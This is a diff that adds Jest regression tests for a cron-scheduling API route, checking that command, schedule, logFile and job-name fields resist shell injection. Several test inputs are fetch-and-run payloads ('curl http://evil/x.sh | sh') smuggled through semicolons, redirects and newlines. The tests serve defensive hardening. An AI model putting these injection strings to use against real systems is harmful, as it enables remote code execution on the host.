@@ -34,6 +34,21 @@ jest.mock("@/lib/paths", () => ({
   PS_DATA_DIR: "/tmp/ch-data",
   getPsScriptsDir: () => "/tmp/ch-data/scripts",
   getPsHardwareLogDir: () => "/tmp/ch-data/logs",
+  readEnv: (...keys: string[]) => {
+    for (const k of keys) {
+      const v = process.env[k];
+      if (v && String(v).trim()) return String(v).trim();
+    }
+    return undefined;
+  },
+}));
+
+// The route now REBUILDS the command from a resolved script path instead of
+// substring-checking the caller's text, so the test must say which script names
+// exist. `fs` is mocked above, so the real existsSync-backed resolver cannot run.
+jest.mock("@/lib/scripts-manager", () => ({
+  resolveScriptPath: (name: string) =>
+    ["ps-backup.mjs", "ps-health-check.mjs"].includes(name) ? `/tmp/ch-data/scripts/${name}` : null,
 }));
 
 jest.mock("@/lib/api-logger", () => ({ logApiError: jest.fn() }));
@@ -110,6 +125,73 @@ describe("POST /api/cron/hardware", () => {
     expect(body.data?.id).toBe("ps-backup");
     expect(mockWritten).toHaveLength(1);
     expect(mockWritten[0]).toContain("/tmp/ch-data/scripts/ps-backup.mjs");
+  });
+
+  // ── Injection regressions ─────────────────────────────────────────────
+  // The old validator was `line.includes(scriptsDir + "/")`, a substring test.
+  // Each of these passed it and became a line in the operator's crontab.
+
+  it("rejects a command that merely MENTIONS the scripts dir", async () => {
+    const { POST } = await import("@/app/api/cron/hardware/route");
+    const req = mockRequest("http://127.0.0.1/api/cron/hardware", "POST", {
+      schedule: "*/5 * * * *",
+      command: "curl http://evil/x.sh | sh # /tmp/ch-data/scripts/",
+      name: "pwn",
+    });
+    expect((await POST(req)).status).toBe(400);
+    expect(mockWritten).toHaveLength(0);
+  });
+
+  it("discards anything appended to a legitimate script path", async () => {
+    mockCrontab = "\n";
+    const { POST } = await import("@/app/api/cron/hardware/route");
+    const req = mockRequest("http://127.0.0.1/api/cron/hardware", "POST", {
+      schedule: "*/5 * * * *",
+      command: "/tmp/ch-data/scripts/ps-backup.mjs; curl http://evil/x.sh | sh",
+      name: "Backup",
+    });
+    expect((await POST(req)).status).toBe(200);
+    expect(mockWritten[0]).not.toContain("evil");
+    expect(mockWritten[0]).not.toContain("curl");
+  });
+
+  it("rejects a schedule field carrying a payload", async () => {
+    const { POST } = await import("@/app/api/cron/hardware/route");
+    const req = mockRequest("http://127.0.0.1/api/cron/hardware", "POST", {
+      schedule: "* * * * *;curl|sh",
+      command: "/tmp/ch-data/scripts/ps-backup.mjs",
+    });
+    expect((await POST(req)).status).toBe(400);
+    expect(mockWritten).toHaveLength(0);
+  });
+
+  it("rejects a logFile that breaks out of the redirect", async () => {
+    const { POST } = await import("@/app/api/cron/hardware/route");
+    const req = mockRequest("http://127.0.0.1/api/cron/hardware", "POST", {
+      schedule: "*/5 * * * *",
+      command: "/tmp/ch-data/scripts/ps-backup.mjs",
+      logFile: "/tmp/x.log 2>&1; curl http://evil/x.sh | sh #",
+    });
+    expect((await POST(req)).status).toBe(400);
+    expect(mockWritten).toHaveLength(0);
+  });
+
+  it("flattens a newline in the job name so it cannot add a crontab line", async () => {
+    mockCrontab = "\n";
+    const { POST } = await import("@/app/api/cron/hardware/route");
+    const req = mockRequest("http://127.0.0.1/api/cron/hardware", "POST", {
+      schedule: "*/5 * * * *",
+      command: "/tmp/ch-data/scripts/ps-backup.mjs",
+      name: "Backup\n* * * * * curl http://evil/x.sh | sh",
+    });
+    expect((await POST(req)).status).toBe(200);
+    // The payload may still appear as TEXT, but only inside the single `#`
+    // comment line — never as a crontab entry of its own. That is the invariant.
+    const executableLines = mockWritten[0]
+      .split("\n")
+      .filter((l) => l.trim() && !l.trim().startsWith("#"));
+    expect(executableLines).toHaveLength(1);
+    expect(executableLines[0]).not.toContain("evil");
   });
 
   it("pauseAll disables each managed job", async () => {
